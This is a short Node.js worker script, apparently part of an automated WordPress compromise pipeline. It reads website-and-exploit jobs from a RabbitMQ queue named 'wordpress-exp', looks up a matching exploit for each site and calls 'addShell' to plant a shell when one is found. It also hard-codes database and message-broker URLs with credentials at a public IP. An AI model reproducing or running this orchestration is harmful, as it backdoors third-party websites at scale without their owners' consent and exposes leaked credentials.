process.env.RETHINKDB_URL = "rethinkdb://207.38.84.54/gambling";
process.env.RABBITMQ_URL = "amqp://test:test@207.38.84.54";
require('coffee-script/register')
const db = require('seokit-db');
const debug = require('debug')(__filename);
const async = require('async-q');
import autobind from 'autobind-decorator'
const amqp = require('amqplib');
const fs = require('fs');
const RABBITMQ_URL = process.env.RABBITMQ_URL || 'amqp://localhost';
const REQ_COUNT = parseInt(process.env.REQ_COUNT || 20);
var Website = null;


console.log('RABBITMQ_URL',RABBITMQ_URL);


@autobind
class Checker {

	channelName = 'wordpress-exp';
	maxCount = REQ_COUNT;

	constructor() {
		db('Website',model=>{
			Website = model;
			this.start().catch(debug)
		});
	}

	async start() {
		this.connection = await amqp.connect(RABBITMQ_URL);
		this.channel = await this.connection.createChannel();
		this.channel.assertQueue(this.channelName, {durable: true}).then(console.log);
		this.channel.prefetch(this.maxCount);
		this.channel.consume(this.channelName, this.receivedMsg, {noAck: false});
	}

	async receivedMsg(msg) {
		console.log(msg.content.toString());
		let {website,exploit} = JSON.parse(msg.content.toString());
		website = new Website(website);
		await this.checkExploit({exploit,website});
		this.channel.ack(msg);
	}

	async checkExploit({exploit,website}) {
		return new Promise(r=>{
			website.findExploit(exploit,(e,_exploit)=>{
				if (e || !_exploit) return r();
				_exploit.addShell(_=>{ r() });
			})
		});
	}

}



new Checker();